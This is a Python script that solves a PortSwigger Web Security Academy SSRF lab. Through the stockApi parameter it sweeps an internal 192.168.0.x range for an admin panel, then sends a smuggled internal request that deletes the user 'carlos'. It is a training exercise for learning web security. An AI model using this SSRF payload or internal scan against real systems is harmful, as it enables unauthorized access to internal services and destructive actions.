# https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

import requests

requests.packages.urllib3.disable_warnings()

scheme = "https://"
host = "acd91fbd1f7c8d9780b435cb00060088.web-security-academy.net"
path = "/product/stock"
url = scheme + host + path
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
verify = False
cookies = {"session": "aDKjiN4bBehR9P24JX74YMpoqd0e2BbT"}

# In order to figure out which internal ip address is correct, i need to try them all
# for i in range(1, 256):
#     payload = f"http://192.168.0.{str(i)}:8080/admin"
#     data = {"stockApi": payload}
#     
#     requests.post(url, proxies=proxies, verify=verify, cookies=cookies, data=data)


payload = "http://192.168.0.50:8080/admin/delete?username=carlos"
data = {"stockApi": payload}

requests.post(url, proxies=proxies, verify=verify, cookies=cookies, data=data)


